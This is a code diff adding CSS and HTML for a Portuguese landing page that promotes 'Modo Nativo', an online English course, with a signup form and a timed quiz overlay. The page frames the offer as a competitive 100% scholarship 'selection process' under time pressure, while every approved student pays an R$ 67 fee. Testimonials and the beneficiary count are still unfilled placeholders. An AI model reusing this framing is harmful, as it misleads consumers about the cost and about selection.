+      color: var(--red);
+      background: rgba(255, 82, 82, 0.1);
+      animation: pulseRed 1s infinite alternate;
+    }
+    
+    .timer-wrap.urgent i {
+      color: var(--red);
+    }
+    
+    @keyframes pulseRed {
+      from { box-shadow: 0 0 0px rgba(255, 82, 82, 0); }
+      to { box-shadow: 0 0 10px rgba(255, 82, 82, 0.3); }
+    }
+    
+    #timer-display {
+      font-variant-numeric: tabular-nums;
+      letter-spacing: 1px;
+    }
+    
+    .progress-container {
+      position: absolute;
+      left: 50%;
+      top: 50%;
+      transform: translate(-50%, -50%);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 4px;
+      width: 100%;
+      max-width: 450px;
+      z-index: 5;
+    }
+    
+    @media(max-width: 800px) {
+      .progress-container {
+        position: static;
+        transform: none;
+        max-width: none;
+        flex: 1;
+      }
+    }
+    
+    #progress-text {
+      font-size: 0.82rem;
+      font-weight: 700;
+      color: var(--text-secondary);
+      text-align: center;
+    }
+    
+    .progress-wrap {
+      width: 100%;
+      height: 6px;
+      background: rgba(255, 255, 255, 0.1);
+      border-radius: 99px;
+      overflow: hidden;
+    }
+    
+    .progress-bar {
+      height: 100%;
+      background: var(--cta-gradient);
+      border-radius: 99px;
+      width: 0%;
+      transition: width 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+    }
+    
+    .quiz-counter {
+      display: none;
+    }
+    
+    .btn-close {
+      background: none;
+      border: none;
+      color: #ffffff;
+      font-size: 1.8rem;
+      cursor: pointer;
+      opacity: 0.6;
+      transition: var(--transition);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      width: 36px;
+      height: 36px;
+      border-radius: 50%;
+    }
+    
+    .btn-close:hover {
+      opacity: 1;
+      color: var(--red);
+      background: rgba(255, 82, 82, 0.1);
+    }
+
+    .quiz-body {
+      flex: 1;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 15px 20px;
+    }
+
+    /* Steps */
+    .step {
+      max-width: 700px;
+      width: 100%;
+      background: var(--bg-card);
+      border-radius: 16px;
+      padding: 24px 28px;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.35);
+      border: 1px solid var(--border);
+      animation: fadeUp 0.5s cubic-bezier(0.16, 1, 0.3, 1) forwards;
+    }
+    
+    .step.hidden {
+      display: none !important;
+    }
+
+    /* Instructions */
+    .instr-title {
+      font-size: 1.15rem;
+      font-weight: 800;
+      text-transform: uppercase;
+      color: #ffffff;
+      margin-bottom: 25px;
+      text-align: center;
+      display: block;
+      width: 100%;
+    }
+    
+    .instr-list {
+      list-style: none;
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+      margin-bottom: 25px;
+      text-align: left;
+    }
+    
+    .instr-list li {
+      font-size: 0.95rem;
+      line-height: 1.5;
+      color: var(--text-secondary);
+      padding: 0;
+      background: transparent;
+      border: none;
+      display: block;
+    }
+    .instr-list li strong {
+      color: #ffffff;
+    }
+
+    /* Question */
+    .q-index {
+      font-size: 0.75rem;
+      font-weight: 700;
+      letter-spacing: 2px;
+      text-transform: uppercase;
+      color: var(--cta2);
+      margin-bottom: 12px;
+    }
+    
+    .q-text {
+      font-size: clamp(1.15rem, 2.5vw, 1.55rem);
+      font-weight: 700;
+      line-height: 1.4;
+      margin-bottom: 25px;
+      color: #ffffff;
+    }
+    
+    .q-text em {
+      font-style: italic;
+      color: var(--cta2);
+      font-weight: 800;
+    }
+    
+    .context-box {
+      background: rgba(255, 255, 255, 0.04);
+      border-left: 4px solid var(--cta);
+      border-radius: 0 12px 12px 0;
+      padding: 16px 20px;
+      font-size: 0.92rem;
+      line-height: 1.65;
+      margin-bottom: 25px;
+      color: var(--text-secondary);
+      border-top: 1px solid var(--border);
+      border-right: 1px solid var(--border);
+      border-bottom: 1px solid var(--border);
+    }
+    
+    .options {
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+    }
+    
+    .opt {
+      display: flex;
+      align-items: center;
+      gap: 15px;
+      padding: 16px 20px;
+      background: #1c1c21;
+      border: 1px solid var(--border);
+      border-radius: 12px;
+      font-size: 0.95rem;
+      font-weight: 600;
+      color: #ffffff;
+      cursor: pointer;
+      transition: var(--transition);
+      text-align: left;
+      font-family: var(--font);
+      width: 100%;
+    }
+    
+    .opt:hover {
+      background: #25252c;
+      border-color: rgba(255, 107, 0, 0.45);
+      transform: translateX(4px);
+    }
+    
+    .opt.selected {
+      border-color: var(--cta);
+      background: rgba(255, 107, 0, 0.16);
+      color: #ffffff;
+      cursor: default;
+      transform: none;
+    }
+    
+    .opt-icon {
+      font-size: 1.35rem;
+      flex-shrink: 0;
+    }
+
+    /* Timeout */
+    .timeout-step-inner {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      text-align: center;
+      padding: 30px;
+    }
+    
+    .timeout-icon {
+      font-size: 4rem;
+      margin-bottom: 20px;
+      color: var(--red);
+      filter: drop-shadow(0 0 15px rgba(255, 82, 82, 0.2));
+    }
+    
+    .timeout-title {
+      font-size: 2rem;
+      font-weight: 800;
+      margin-bottom: 12px;
+      color: var(--red);
+    }
+    
+    .timeout-desc {
+      color: var(--text-secondary);
+      margin-bottom: 35px;
+      line-height: 1.65;
+      max-width: 460px;
+      font-size: 0.95rem;
+    }
+
+    /* Buttons (quiz) */
+    .btn-quiz {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      padding: 16px 36px;
+      border-radius: 12px;
+      font-family: var(--font);
+      font-weight: 700;
+      font-size: 0.95rem;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+      cursor: pointer;
+      border: none;
+      transition: var(--transition);
+      text-decoration: none;
+      width: 100%;
+      max-width: 380px;
+      margin: 25px auto 0;
+      background: var(--cta-gradient);
+      color: #fff;
+      box-shadow: 0 6px 20px rgba(255, 107, 0, 0.35);
+    }
+    
+    .btn-quiz:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 10px 25px rgba(255, 107, 0, 0.55);
+      filter: brightness(1.08);
+    }
+    
+    .btn-quiz:disabled {
+      opacity: 0.35;
+      cursor: not-allowed;
+      transform: none !important;
+      animation: none;
+      box-shadow: none;
+    }
+
+    .quiz-footer {
+      text-align: center;
+      padding: 24px 16px;
+      font-size: 0.78rem;
+      color: #a1a1aa;
+      line-height: 1.6;
+      background: #141414;
+      border-top: 1px solid rgba(255, 255, 255, 0.06);
+      width: 100%;
+      margin-top: auto;
+    }
+    .quiz-footer a {
+      color: #a1a1aa;
+      text-decoration: none;
+      margin: 0 6px;
+    }
+    .quiz-footer a:hover {
+      color: #ffffff;
+    }
+
+    /* ═══════ RESPONSIVE ═══════ */
+    @media(max-width:990px) {
+      .hero-inner {
+        grid-template-columns: 1fr;
+        gap: 40px;
+      }
+      .hero-card {
+        display: none;
+      }
+      .logo-wrap {
+        justify-content: center;
+      }
+      .hero-h1, .hero-sub {
+        text-align: center;
+      }
+      .checklist {
+        align-items: center;
+        justify-content: center;
+      }
+      .form-card {
+        margin: 0 auto;
+      }
+      .project-grid {
+        grid-template-columns: 1fr;
+      }
+      .project-grid-2 {
+        grid-template-columns: 1fr;
+      }
+      .material-showcase {
+        grid-template-columns: 1fr;
+        padding: 30px;
+        gap: 30px;
+      }
+      .perks-grid {
+        grid-template-columns: repeat(2, 1fr);
+      }
+      .behind-layout {
+        grid-template-columns: 1fr;
+        gap: 40px;
+      }
+      .phases-grid {
+        grid-template-columns: 1fr;
+      }
+      .criteria-layout {
+        grid-template-columns: 1fr;
+        gap: 30px;
+      }
+      .about-inst-layout {
+        grid-template-columns: 1fr;
+        gap: 40px;
+      }
+    }
+    
+    @media(max-width:600px) {
+      .section {
+        padding: 60px 0;
+      }
+      .hero {
+        padding: 30px 0 30px;
+      }
+      .hero-h1 {
+        font-size: 1.35rem;
+        line-height: 1.5;
+      }
+      .hero-left {
+        gap: 10px;
+      }
+      .checklist {
+        margin: 5px 0;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        gap: 8px;
+      }
+      .hero-sub {
+        margin-bottom: 5px;
+        font-size: 0.88rem;
+      }
+      .form-card {
+        padding: 0;
+      }
+      .form-card .fg input {
+        height: 45px;
+        padding: 0 16px;
+        font-size: 0.88rem;
+        box-sizing: border-box;
+      }
+      #btn-hero-start, .btn-gold {
+        padding: 12px 20px !important;
+        font-size: 0.95rem;
+      }
+      .perks-grid {
+        grid-template-columns: 1fr;
+      }
+      .quiz-topbar {
+        padding: 12px 16px;
+        gap: 12px;
+      }
+      .quiz-body {
+        padding: 8px 16px;
+      }
+      .btn-quiz {
+        font-size: 0.88rem;
+        padding: 14px 24px;
+      }
+      .q-text {
+        font-size: 1.05rem;
+      }
+      .opt {
+        padding: 14px 16px;
+        font-size: 0.9rem;
+        border-radius: 12px;
+      }
+      .step {
+        padding: 16px;
+      }
+      .level-item {
+        grid-template-columns: 1fr;
+        justify-items: center;
+        text-align: center;
+      }
+      .slide {
+        padding: 0 12px;
+      }
+      .testi-card {
+        padding: 28px 20px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <!-- Google Tag Manager (noscript) -->
+  <noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-M2Q6K5BN"
+  height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+  <!-- End Google Tag Manager (noscript) -->
+
+<!-- ══════════════════════════════════════════════════
+     HERO / HOME PAGE
+══════════════════════════════════════════════════ -->
+<section class="hero" id="home">
+  <div class="container hero-inner">
+
+    <!-- COLUNA ESQUERDA -->
+    <div class="hero-left">
+      <div class="logo-wrap">
+        <div class="mn-brand-inline">
+          <img src="/assets/logo-transparente.webp" alt="Modo Nativo" width="240" height="227">
+          <span>Modo Nativo</span>
+        </div>
+      </div>
+
+      <h1 class="hero-h1">
+        CONQUISTE A TÃO SONHADA<br>
+        <span class="destaque">FLUÊNCIA EM INGLÊS</span> ESTUDANDO<br>
+        SÓ 15 MINUTOS POR DIA, COM<br>
+        A TÉCNICA DE <span class="destaque">SHADOWING</span> E<br>
+        BOLSAS DE ATÉ 100%
+      </h1>
+
+      <ul class="checklist">
+        <li><i class='bx bx-check'></i> PLATAFORMA 100% ONLINE</li>
+        <li><i class='bx bx-check'></i> <span class="placeholder-inline">[PREENCHER]</span></li>
+      </ul>
+
+      <p class="hero-sub">
+        Inscrições abertas para o Processo Seletivo de 2026<br><br>
+        <u>Últimas vagas desta etapa</u>, junte-se a<br>
+        <span class="placeholder-inline">[PREENCHER]</span> beneficiados.
+      </p>
+
+      <!-- FORM CARD -->
+      <div class="form-card" id="form">
+        <div class="fg">
+          <input type="text" id="f-name" placeholder="Digite seu nome completo..." autocomplete="name">
+          <div class="err-msg" id="err-name"><i class='bx bx-error-circle'></i> Por favor, insira seu nome completo.</div>
+        </div>
+        <div class="fg">
+          <input type="email" id="f-email" placeholder="Digite seu melhor e-mail..." autocomplete="email">
+          <div class="err-msg" id="err-email"><i class='bx bx-error-circle'></i> Por favor, insira um e-mail válido.</div>
+        </div>
+        <div class="fg">
+          <input type="tel" id="f-phone" placeholder="17 99141-2050" autocomplete="tel" inputmode="tel">
+          <div class="err-msg" id="err-phone"><i class='bx bx-error-circle'></i> <span id="err-phone-text">Digite o DDD e o celular com 9 dígitos</span></div>
+        </div>
+        <button class="btn-gold" id="btn-hero-start" style="width: 100%;">
+          FAZER INSCRIÇÃO
+        </button>
+      </div>
+    </div>
+
+    <!-- COLUNA DIREITA, card imagem -->
+    <div class="hero-card">
+      <img src="/assets/diagnostico/aluna.jpg" alt="Aluna estudando no Modo Nativo">
+    </div>
+
+  </div>
+</section>
+
+<!-- ══════════════════════════════════════════════════
+     SECTION 2: ENTENDA O MODO NATIVO
+══════════════════════════════════════════════════ -->
+<section class="section reveal">
+  <div class="container">
+    <div class="brand-logo-center">
+      <img src="/assets/logo-transparente.webp" alt="Logo Modo Nativo" width="240" height="227">
+    </div>
+    <h2 class="section-title">Entenda mais sobre <span>o Modo Nativo</span></h2>
+    <div class="divider"></div>
+    
+    <div class="project-grid">
+      <div class="project-card">
+        <i class='bx bx-globe'></i>
+        <h3>O que é o Modo Nativo?</h3>
+        <p>O Modo Nativo é um programa educacional de iniciativa privada focado no aprimoramento prático do ensino da língua inglesa, comprometido com a evolução real na conversação.</p>
+      </div>
+      <div class="project-card">
+        <i class='bx bxs-award'></i>
+        <h3>Por quem foi desenvolvido?</h3>
+        <p>Desenvolvido pelo Modo Nativo. <span class="placeholder-inline">[PREENCHER]</span></p>
+      </div>
+      <div class="project-card">
+        <i class='bx bx-message-square-detail'></i>
+        <h3>Como funciona?</h3>
+        <p>O programa aplica o curso Do Zero à Conversação: 161 lições de 15 minutos, do A1 ao C2, técnica de Shadowing e correção da pronúncia por IA.</p>
+      </div>
+    </div>
+    
+    <div class="project-grid-2">
+      <div class="project-card">
+        <i class='bx bx-target-lock'></i>
+        <h3>Qual a nossa missão?</h3>
+        <p>Preparar brasileiros para falar inglês sem travar, promovendo um método direto ao ponto que se encaixa na rotina corrida com sessões práticas de 15 minutos.</p>
+      </div>
+      <div class="project-card">
+        <i class='bx bxs-user-badge'></i>
+        <h3>Quem será contemplado?</h3>
+        <p>O programa libera 1.000 bolsas de 100% para jovens e adultos de todas as cidades do Brasil estudarem do básico ao avançado.</p>
+      </div>
+    </div>
+    
+    <div class="center-cta-wrap">
+      <a href="#form" class="btn-gold">Quero uma Bolsa de Estudos!</a>
+    </div>
+  </div>
+</section>
+
+<!-- ══════════════════════════════════════════════════
+     SECTION 3: CURSOS OFERECIDOS & MATERIAL
+══════════════════════════════════════════════════ -->
+<section class="section courses-bg reveal">
+  <div class="container">
+    <h2 class="section-subtitle">Oportunidade única</h2>
+    <h2 class="section-title">Qual curso <span>é oferecido?</span></h2>
+    <div class="divider"></div>
+    
+    <div class="course-intro">
+      <img src="/assets/logo-transparente.webp" alt="Do Zero à Conversação" class="course-logo" width="240" height="227">
+      <h3>Curso Do Zero à Conversação</h3>
+      <p>Os beneficiados pelo programa terão acesso ao curso online completo desenvolvido pelo <strong>Modo Nativo</strong>. O curso <strong>Do Zero à Conversação</strong> conta com <strong>161 lições de 15 minutos, do A1 ao C2, técnica de Shadowing e correção da pronúncia por IA</strong>, seguindo o Quadro Comum Europeu de Referência para Línguas. Os estudantes podem acessar a plataforma <strong>24 horas por dia, 7 dias por semana</strong> de qualquer lugar do mundo.</p>
+    </div>
+    
+    <div class="material-showcase" style="margin-top: 50px;">
+      <div class="phone-mockup">
+        <img src="/assets/diagnostico/pronuncia.jpg" alt="Plataforma Modo Nativo">
+      </div>
+      <div class="material-desc">
+        <h2>Plataforma Prática <span>Completa, Online e Interativa</span></h2>
+        <p>A plataforma conta com recursos completos em cada nível de inglês, com treino guiado de escuta, repetição em voz alta e feedback imediato para te <b>ajudar de forma prática a atingir seu objetivo rumo à fluência no idioma mais falado no mundo.</b></p>
+        <div>
+          <a href="#form" class="btn-gold" style="margin-top: 10px;">Quero me inscrever!</a>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ══════════════════════════════════════════════════
+     SECTION 4: VEJA O QUE VAI RECEBER
+══════════════════════════════════════════════════ -->
+<section class="section reveal">
+  <div class="container">
+    <h2 class="section-title">Veja o que <span>você vai receber</span></h2>
+    <div class="divider"></div>
+    
+    <div class="perks-grid">
+      <div class="perk-card">
+        <div class="perk-icon"><i class='bx bx-laptop'></i></div>
+        <h3>Plataforma 100% Online</h3>
+        <p>Disponível para estudar 24 horas por dia, 7 dias por semana em qualquer dispositivo, seja no tablet, no celular ou no computador.</p>
+      </div>
+      <div class="perk-card">
+        <div class="perk-icon"><i class='bx bx-play-circle'></i></div>
+        <h3>161 Lições de 15 Minutos</h3>
+        <p>Lições objetivas do A1 ao C2 que captam a atenção do aluno, com recursos interativos que permitem participação ativa todos os dias.</p>
+      </div>
+      <div class="perk-card">
+        <div class="perk-icon"><i class='bx bx-headphone'></i></div>
+        <h3>Técnica de Shadowing</h3>
+        <p>Práticas focadas em escuta e repetição que expõem o aluno ao inglês real e destravam a fala de forma natural.</p>
+      </div>
+      <div class="perk-card">
+        <div class="perk-icon"><i class='bx bx-microphone'></i></div>
+        <h3>Correção da Pronúncia por IA</h3>
+        <p>Feedback imediato da sua fala para ajustar cada som e ganhar confiança na conversação desde as primeiras lições.</p>
+      </div>
+      <div class="perk-card">
+        <div class="perk-icon"><i class='bx bx-check-Double'></i></div>
+        <h3>Exercícios e Revisão</h3>
+        <p>Atividades práticas de escrita e revisão em cards, desafiando você a aplicar o que foi aprendido e reforçando a retenção.</p>
+      </div>
+      <div class="perk-card">
+        <div class="perk-icon"><i class='bx bx-award'></i></div>
+        <h3><span class="placeholder-inline">[PREENCHER]</span></h3>
+        <p><span class="placeholder-inline">[PREENCHER]</span></p>
+      </div>
+    </div>
+    
+    <div class="center-cta-wrap">
+      <a href="#form" class="btn-gold">Quero meu acesso!</a>
+    </div>
+  </div>
+</section>
+
+<!-- ══════════════════════════════════════════════════
+     SECTION 5: QUEM ESTÁ POR TRÁS
+══════════════════════════════════════════════════ -->
+<section class="section behind-bg reveal">
+  <div class="container">
+    <h2 class="section-title">Quem está <span>por trás?</span></h2>
+    <div class="divider"></div>
+    
+    <div class="behind-layout">
+      <div class="behind-image">
+        <div class="placeholder-block" style="min-height: 300px;">[PREENCHER IMAGEM]</div>
+        <div class="behind-badge">Modo Nativo</div>
+      </div>
+      <div class="behind-desc">
+        <ul class="behind-list">
+          <li>
+            <i class='bx bxs-chevron-right-circle'></i>
+            <span>O programa de bolsas foi desenvolvido pelo <strong>Modo Nativo</strong>. <span class="placeholder-inline">[PREENCHER]</span></span>
+          </li>
+          <li>
+            <i class='bx bxs-chevron-right-circle'></i>
+            <span><span class="placeholder-inline">[PREENCHER]</span></span>
+          </li>
+          <li>
+            <i class='bx bxs-chevron-right-circle'></i>
+            <span><span class="placeholder-inline">[PREENCHER]</span></span>
+          </li>
+          <li>
+            <i class='bx bxs-chevron-right-circle'></i>
+            <span>A partir de agora você conseguirá estudar online de forma simples e prática com o curso <strong>Do Zero à Conversação: 161 lições de 15 minutos, do A1 ao C2, técnica de Shadowing e correção da pronúncia por IA.</strong></span>
+          </li>
+        </ul>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ══════════════════════════════════════════════════
+     SECTION 6: PROGRAMA DE BOLSAS (FASES)
+══════════════════════════════════════════════════ -->
+<section class="section reveal">
+  <div class="container">
+    <div class="section-subtitle" style="text-align: center; font-size: 1.2rem; color: var(--cta2); margin-bottom: 5px;">
+      <i class='bx bxs-star'></i><i class='bx bxs-star'></i><i class='bx bxs-star'></i><i class='bx bxs-star'></i><i class='bx bxs-star'></i>
+    </div>
+    <h2 class="section-title">Como funciona o <span>programa de bolsas?</span></h2>
+    <div class="divider"></div>
+    
+    <div class="phases-grid">
+      <div class="phase-card">
+        <h4>FASE 1</h4>
+        <div class="phase-icon"><i class='bx bx-user-plus'></i></div>
+        <h3>CADASTRO</h3>
+        <p>Você se cadastra através do formulário disponível aqui no site e inicia imediatamente a etapa de avaliação online.</p>
+      </div>
+      <div class="phase-card">
+        <h4>FASE 2</h4>
+        <div class="phase-icon"><i class='bx bx-list-check'></i></div>
+        <h3>PROCESSO SELETIVO</h3>
+        <p>Ao se cadastrar, você inicia o teste rápido e interativo. Você receberá o resultado logo após finalizar as questões.</p>
+      </div>
+      <div class="phase-card">
+        <h4>FASE 3</h4>
+        <div class="phase-icon"><i class='bx bx-medal'></i></div>
+        <h3>BOLSISTA</h3>
+        <p>São 1.000 bolsas de 100%. Com a bolsa, o curso sai de R$ 297 por R$ 0 e o aluno aprovado paga apenas a taxa de matrícula única de R$ 67.</p>
+      </div>
+    </div>
+    
+    <div class="center-cta-wrap">
+      <a href="#form" class="btn-gold">Quero me inscrever!</a>
+    </div>
+  </div>
+</section>
+
+<!-- ══════════════════════════════════════════════════
+     SECTION 7: NÍVEIS DO CURSO
+══════════════════════════════════════════════════ -->
+<section class="section levels-bg reveal">
+  <div class="container">
+    <h2 class="section-subtitle font-weight-bold">Desenvolvimento Completo</h2>
+    <h2 class="section-title">Ao final de cada nível <span>você será capaz de:</span></h2>
+    <div class="divider"></div>
+    
+    <div class="levels-list">
+      <div class="level-item">
+        <i class='bx bxs-check-circle level-check'></i>
+        <div class="level-content">
+          <h4>LEVEL 1 - BEGINNER (A1)</h4>
+          <p>Você será capaz de compreender e usar expressões cotidianas familiares e frases muito básicas destinadas à comunicação básica. Além disso, será capaz de se apresentar e de apresentar outras pessoas e pode fazer e responder perguntas sobre dados pessoais, como onde mora, pessoas que conhece e coisas que possui.</p>
+        </div>
+      </div>
+      
+      <div class="level-item">
+        <i class='bx bxs-check-circle level-check'></i>
+        <div class="level-content">
+          <h4>LEVEL 2 - ELEMENTARY (A2)</h4>
+          <p>Você será capaz de compreender frases e expressões usadas com frequência relacionadas a áreas de relevância mais imediata (por exemplo, informações pessoais e familiares muito básicas, compras, geografia local, emprego). O aluno poderá se comunicar em tarefas simples e rotineiras que requerem uma troca simples e direta de informações.</p>
+        </div>
+      </div>
+      
+      <div class="level-item">
+        <i class='bx bxs-check-circle level-check'></i>
+        <div class="level-content">
+          <h4>LEVEL 3 - PRE INTERMEDIATE (B1.1)</h4>
+          <p>Você será capaz de entender os pontos principais sobre assuntos conhecidos (trabalho, escola, lazer). Saberá lidar com a maioria das situações que surgem durante uma viagem a locais onde o idioma é falado. Poderá produzir textos simples sobre tópicos familiares e descrever experiências, eventos e ambições.</p>
+        </div>
+      </div>
+      
+      <div class="level-item">
+        <i class='bx bxs-check-circle level-check'></i>
+        <div class="level-content">
+          <h4>LEVEL 4 - INTERMEDIATE (B1.2)</h4>
+          <p>O aluno será capaz de compreender as ideias principais de comunicações complexas tanto em tópicos concretos como abstratos, incluindo discussões técnicas. Poderá interagir com um grau de fluência e espontaneidade que torna possível a interação regular com falantes nativos sem tensão para nenhuma das partes.</p>
+        </div>
+      </div>
+      
+      <div class="level-item">
+        <i class='bx bxs-check-circle level-check'></i>
+        <div class="level-content">
+          <h4>LEVEL 5 - UPPER INTERMEDIATE (B2)</h4>
+          <p>O aluno será capaz de compreender uma grande variedade de assuntos mais exigentes. Será capaz de se expressar fluentemente e espontaneamente sem busca óbvia de expressões. Poderá utilizar o idioma de maneira flexível e eficaz para fins sociais, acadêmicos e profissionais de forma bem estruturada.</p>
+        </div>
+      </div>
+      
+      <div class="level-item">
+        <i class='bx bxs-check-circle level-check'></i>
+        <div class="level-content">
+          <h4>LEVEL 6 - ADVANCED (C1/C2)</h4>
+          <p>Nesse nível, o aluno já é capaz de compreender com facilidade praticamente tudo que ouve ou lê. Consegue resumir informações de diferentes fontes faladas e escritas, reconstruindo argumentos em uma apresentação coerente. Consegue se expressar de forma espontânea, fluente e precisa com sutilezas.</p>
+        </div>
+      </div>
+    </div>
+    
+    <div class="center-cta-wrap">
+      <a href="#form" class="btn-gold">Quero me inscrever!</a>
+    </div>
+  </div>
+</section>
+
+<!-- ══════════════════════════════════════════════════
+     SECTION 8: DESTAQUES NA MÍDIA (PLACEHOLDER)
+══════════════════════════════════════════════════ -->
+<section class="media-section">
+  <div class="container">
+    <div class="media-wrap">
+      <div class="placeholder-block" style="max-width: 720px; min-height: 80px;">[PREENCHER]</div>
+    </div>
+  </div>
+</section>
+
+<!-- ══════════════════════════════════════════════════
+     SECTION 9: QUEM PODE PARTICIPAR
+══════════════════════════════════════════════════ -->
+<section class="section reveal">
+  <div class="container">
+    <h2 class="section-title">Quem pode <span>participar?</span></h2>
+    <div class="divider"></div>
+    
+    <div class="criteria-layout">
+      <div class="criteria-left">
+        <img src="/assets/diagnostico/colagem.jpg" alt="Estudantes Modo Nativo">
+      </div>
+      <div class="criteria-right">
+        <div class="criteria-card">
+          <i class='bx bx-id-card'></i>
+          <div>
+            <h4>Idade Mínima</h4>
+            <p>Destinado a jovens e adultos com idade a partir de 14 anos.</p>
+          </div>
+        </div>
+        <div class="criteria-card">
+          <i class='bx bx-map-pin'></i>
+          <div>
+            <h4>Residência no Brasil</h4>
+            <p>Qualquer pessoa residente em cidades do território nacional brasileiro.</p>
+          </div>
+        </div>
+        <div class="criteria-card">
+          <i class='bx bx-wifi'></i>
+          <div>
+            <h4>Conectividade</h4>
+            <p>Ter acesso a um celular, tablet ou computador conectado à internet.</p>
+          </div>
+        </div>
+        <div class="criteria-card">
+          <i class='bx bx-user-voice'></i>
+          <div>
+            <h4>Comprometimento</h4>
+            <p>Disposição e vontade de se dedicar 15 minutos por dia rumo à conversação.</p>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ══════════════════════════════════════════════════
+     SECTION 10: DEPOIMENTOS DE ALUNOS
+══════════════════════════════════════════════════ -->
+<section class="section testimonial-section reveal">
+  <div class="container">
+    <h2 class="section-title">O que dizem <span>nossos alunos?</span></h2>
+    <div class="divider"></div>
+    
+    <div class="slider-container">
+      <div class="slider-wrapper" id="slider-wrapper">
+        
+        <div class="slide">
+          <div class="testi-card">
+            <i class='bx bxs-quote-left quote-icon'></i>
+            <p class="testi-text">[PREENCHER]</p>
+            <span class="testi-author">[PREENCHER]</span>
+            <span class="testi-city">[PREENCHER]</span>
+          </div>
+        </div>
+        
+        <div class="slide">
+          <div class="testi-card">
+            <i class='bx bxs-quote-left quote-icon'></i>
+            <p class="testi-text">[PREENCHER]</p>
+            <span class="testi-author">[PREENCHER]</span>
+            <span class="testi-city">[PREENCHER]</span>
+          </div>
+        </div>
+        
+        <div class="slide">
+          <div class="testi-card">
+            <i class='bx bxs-quote-left quote-icon'></i>
+            <p class="testi-text">[PREENCHER]</p>
+            <span class="testi-author">[PREENCHER]</span>
+            <span class="testi-city">[PREENCHER]</span>
+          </div>
+        </div>
+        
+      </div>
+      
+      <!-- Arrows -->
+      <div class="slider-arrow prev" id="slider-prev"><i class='bx bx-chevron-left'></i></div>
+      <div class="slider-arrow next" id="slider-next"><i class='bx bx-chevron-right'></i></div>
+      
+      <!-- Dots -->
+      <div class="slider-dots" id="slider-dots"></div>
+    </div>
+  </div>
+</section>
+
+<!-- ══════════════════════════════════════════════════
+     SECTION 11: CONHEÇA O MODO NATIVO
+══════════════════════════════════════════════════ -->
+<section class="section reveal">
+  <div class="container">
+    <div class="about-inst-layout">
+      <div class="about-inst-left">
+        <h2>Conheça o <span>Modo Nativo</span></h2>
+        <p><span class="placeholder-inline">[PREENCHER]</span></p>
+        <p>Com o curso <strong>Do Zero à Conversação</strong>, você estuda com <strong>161 lições de 15 minutos, do A1 ao C2, técnica de Shadowing e correção da pronúncia por IA</strong>.</p>
+        <div>
+          <a href="#form" class="btn-gold" style="margin-top: 15px;">Quero começar agora!</a>
+        </div>
+      </div>
+      <div class="about-inst-right">
+        <div class="placeholder-block" style="min-height: 280px;">[PREENCHER IMAGEM]</div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ══════════════════════════════════════════════════
+     SECTION 12: A MELHOR OFERTA DO ANO (FINAL CTA)
+══════════════════════════════════════════════════ -->
+<section class="section final-cta reveal">
+  <div class="container final-cta-content">
+    <h3>1.000 Bolsas de 100% por tempo limitado</h3>
+    <h2>A Melhor Oferta do Ano</h2>
+    <p>Essa é uma oportunidade única para você destravar seu inglês com o Modo Nativo com bolsa de estudo de 100%, pagando apenas a taxa única de matrícula de R$ 67.</p>
+    <a href="#form" class="btn-gold" style="margin-top: 10px;">Inscreva-se Agora <i class='bx bx-rocket'></i></a>
+  </div>
+</section>
+
+<!-- FOOTER PADRÃO MODO NATIVO -->
+<style>.mn-footer{width:100%;background:#141414;border-top:1px solid rgba(255,255,255,0.06);padding:48px 20px;font-family:inherit;box-sizing:border-box}.mn-footer-inner{max-width:1120px;margin:0 auto;display:flex;flex-direction:column;align-items:center;text-align:center;gap:24px}.mn-footer-brand{display:inline-flex;align-items:center;justify-content:center;gap:10px}.mn-footer-brand img{height:40px;width:auto;display:block;margin:0}.mn-footer-brand span{font-weight:700;font-size:18px;line-height:1.2;color:#ffffff}.mn-footer-copy{margin:0;font-size:14px;line-height:1.5;color:#a1a1aa}.mn-footer-links{display:flex;flex-wrap:wrap;align-items:center;justify-content:center;gap:6px 10px;font-size:14px;line-height:1.5;color:#71717a}.mn-footer-links a{color:#a1a1aa;text-decoration:none;transition:color 0.2s ease}.mn-footer-links a:hover{color:#ffffff}.mn-footer-dot{font-size:12px;color:#71717a;user-select:none}@media(max-width:650px){.mn-footer{padding:36px 16px}}</style>
+<footer class="mn-footer">
+  <div class="mn-footer-inner">
+    <div class="mn-footer-brand">
+      <img src="/assets/logo-transparente.webp" alt="Modo Nativo" width="240" height="227" loading="lazy" decoding="async">
+      <span>Modo Nativo</span>
+    </div>
+    <p class="mn-footer-copy">Modo Nativo© é uma marca da empresa Modo Nativo Educação Digital, CNPJ 70.057.911/0001-30</p>
+    <div class="mn-footer-links">
+      <a href="/termos">Termos de Uso</a>
+      <span class="mn-footer-dot" aria-hidden="true">•</span>
+      <a href="/privacidade">Política de Privacidade</a>
+      <span class="mn-footer-dot" aria-hidden="true">•</span>
+      <a href="/consideracoes">Considerações Importantes</a>
+    </div>
+  </div>
+</footer>
+
+<!-- ══════════════════════════════════════════════════
+     QUIZ OVERLAY
+══════════════════════════════════════════════════ -->
+<div class="quiz-overlay" id="quiz-overlay">
+
+  <div class="quiz-topbar">
+    <div class="topbar-left">
+      <img src="/assets/logo-transparente.webp" alt="Logo Modo Nativo" class="quiz-logo" width="240" height="227">
+      <div class="timer-wrap" id="timer-wrap">
+        <i class='bx bx-time-five'></i>
+        <span id="timer-display">30:00</span>
+      </div>
+    </div>
+    <div class="progress-container">
+      <span id="progress-text">0% Completado</span>
+      <div class="progress-wrap">
+        <div class="progress-bar" id="progress-bar"></div>
+      </div>
+    </div>
+    <span class="quiz-counter" id="counter">0 / 20</span>
